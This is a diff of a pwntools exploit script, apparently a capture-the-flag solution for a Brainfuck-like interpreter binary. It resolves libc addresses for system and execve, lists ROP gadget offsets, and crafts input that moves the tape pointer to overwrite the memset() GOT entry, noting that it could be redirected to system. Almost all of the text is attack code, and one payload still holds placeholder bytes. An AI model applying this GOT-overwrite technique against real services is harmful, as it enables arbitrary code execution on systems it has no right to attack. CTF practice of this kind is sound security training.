@@ -34,7 +34,6 @@ print(conn.recvline()) # main massage
 
 with open("payload", "w") as f:
     f.write("")
-#payload = ",.,.<\nAB\n".encode() # --> should work
 # 1st part - before the input - just the commands
 system_addr = libc.symbols["system"]
 execve_addr = libc.symbols["execve"]
@@ -104,12 +103,25 @@ heap_arbitrary_addr = 0x804b0a7
 heap_rop_nop = libc_addr + 0x0000c30c
 print(f"heap nop rop : {hex(heap_rop_nop)}")
 #payload =my_rop
-payload = p32(system_addr)
-heap_rop_push_edx = libc_addr + 0x0013cfd8
-payload += p32(system_addr)
+fgets_addr_in_main = 0x8048734
+memset_addr_in_main = 0x8048700
+# 2nd program iteration - 1st half
+payload = p32(memset_addr_in_main)
+payload += b"<"  * 7# decrease from putchar() GOT to memset() GOT address
+payload += b",>,>,>," # Setting the memset() GOT address
+payload += b"[" # call to puts()
+payload += b"\n" # call to puts()
+ # we can replace the address of memset with the address of system!
 conn.sendline(payload)
 with open("payload", "ab+") as f:
     f.write(payload)
 
-print(payload)
+# 2nd program iteration - 2nd half
+payload = b"AAAABBBB" # the new address of memset()
+payload += b"\n" # call to puts()
+conn.sendline(payload)
 
+with open("payload", "ab+") as f:
+    f.write(payload)
+
+print(payload)
